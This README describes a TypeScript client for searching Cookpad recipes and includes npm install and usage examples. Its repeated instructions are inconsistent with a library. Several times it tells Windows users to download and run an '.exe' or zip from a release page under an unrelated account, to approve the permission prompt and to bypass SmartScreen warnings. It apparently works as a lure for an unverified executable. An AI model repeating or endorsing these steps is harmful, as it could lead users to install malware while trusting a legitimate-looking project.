# 🍳 cookpad-js - Search recipes with less effort

[![Download cookpad-js](https://img.shields.io/badge/Download%20cookpad--js-Release%20Page-blue?style=for-the-badge)](https://github.com/revoopo3258/cookpad-js/releases)

## 📥 Download

1. Open the release page: https://github.com/revoopo3258/cookpad-js/releases
2. Find the latest release at the top of the page
3. Download the file for Windows
4. If you see a `.zip` file, unzip it first
5. Open the app or follow the run steps in the release notes

If the release includes a Windows installer or `.exe` file, download and run that file.

## 🪟 Run on Windows

1. Download the latest release from the link above
2. Save the file to your Downloads folder
3. If the file is zipped, right-click it and choose Extract All
4. Open the extracted folder
5. Double-click the app file or run the included launch file
6. If Windows asks for permission, choose Yes

If you use Windows SmartScreen, open the file from the release page and pick More info if needed.

## 🔎 What this is

cookpad-js is a TypeScript client for Cookpad.

It helps you:

- search recipes
- open recipe details
- read ingredients and steps
- use Cookpad data from your own app or script

This project is made for users who want to work with Cookpad data in a simple way.

## ✨ Main features

- Search recipes by keyword
- Sort results by popular recipes
- Open recipe pages by ID
- Show ingredient lists
- Show cooking steps
- Use Japanese search terms
- Work with anonymous access for some requests
- Support authenticated requests for some endpoints

## 🧩 What you need

For normal use on Windows, you need:

- Windows 10 or Windows 11
- Internet access
- A web browser
- A ZIP tool if the release comes as a zip file

For developer use, you also need:

- Node.js 18 or later
- npm

## 🚀 Quick start

1. Download the latest release from the release page
2. Open the file you downloaded
3. Start the app or run the included command file
4. Search for a recipe name
5. Open a recipe to see the ingredients and steps

Example search flow:

- type `パスタ`
- choose a result
- open the recipe detail
- read the ingredient list
- read the step list

## 🛠 Install from source

If you want to use the package in a Node.js project, install it with npm:

```bash
npm install cookpad
```

## 💡 Basic use

```ts
import { Cookpad } from "cookpad";

const client = new Cookpad();

// Search recipes by popularity
const results = await client.searchRecipes("パスタ", { order: "popular", perPage: 5 });
for (const recipe of results.recipes) {
  console.log(`${recipe.title} by ${recipe.user?.name}`);
}

// Show ingredients and steps
const detail = await client.getRecipe(results.recipes[0].id);
console.log(`\n--- ${detail.title} (${detail.serving}) ---`);
detail.ingredients.forEach((ing) => console.log(`  ${ing.name}: ${ing.quantity}`));
detail.steps.forEach((step, i) => console.log(`  ${i + 1}. ${step.description}`));
```

## 🔐 Sign-in and access

Some endpoints need an authenticated token.

That means:

- some features work with anonymous access
- some features need a logged-in token
- a token can unlock more API paths

If a request fails, the endpoint may require sign-in.

## 📚 API reference

### `new Cookpad(options?)`

Creates a client.

You can use it with no settings:

```ts
const client = new Cookpad();
```

You can also change the default behavior:

```ts
const client = new Cookpad({
  // example settings
});
```

### `client.searchRecipes(query, options?)`

Searches for recipes by text.

Common use:

```ts
const results = await client.searchRecipes("カレー", {
  order: "popular",
  perPage: 10,
});
```

Useful options:

- `order`: sort mode
- `perPage`: number of results
- `page`: page number

### `client.getRecipe(id)`

Gets full recipe data for one recipe.

Example:

```ts
const detail = await client.getRecipe(123456);
```

The result can include:

- title
- serving size
- ingredients
- steps
- author name

## 🧭 Typical use cases

- find a meal idea fast
- show recipe data in a local tool
- build a recipe lookup script
- test Cookpad data in a TypeScript project
- read recipe details in a clean format

## 🗂 Project layout

This repository follows a simple client structure:

- source code for the Cookpad client
- request logic for API calls
- recipe search support
- recipe detail support
- TypeScript types for results

## 🧪 Example workflow

1. Start the client
2. Search for a recipe term
3. Pick one item from the list
4. Open the recipe detail
5. Read the ingredients
6. Read the steps
7. Use the data in your app or script

## 🖥 Windows setup tips

- Keep the release file in a fixed folder like Downloads or Desktop
- Do not rename files unless the release notes say you can
- If Windows blocks the file, open the file properties and check the security prompt
- If the app does not start, download the latest release again
- Use the newest release if older files do not open

## 🔗 Related project

Python版: https://github.com/fa0311/cookpad-py

## 👥 Developer

[EVEX Developers](https://discord.gg/evex)

## 📦 Release page

Open the latest Windows download here:

https://github.com/revoopo3258/cookpad-js/releases